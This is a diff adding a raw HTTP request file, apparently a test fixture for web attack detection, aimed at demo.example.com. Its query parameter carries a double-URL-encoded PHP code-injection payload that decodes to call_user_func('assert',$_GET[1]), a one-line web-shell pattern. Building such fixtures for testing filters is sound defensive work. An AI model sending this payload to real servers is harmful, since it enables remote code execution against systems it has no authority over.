@@ -1,0 +1,4 @@
+GET /a?data=call_user_func%2528%2527assert%2527%252C%2524_GET%255B1%255D%2529 HTTP/1.1
+Host: demo.example.com
+Connection: close
+
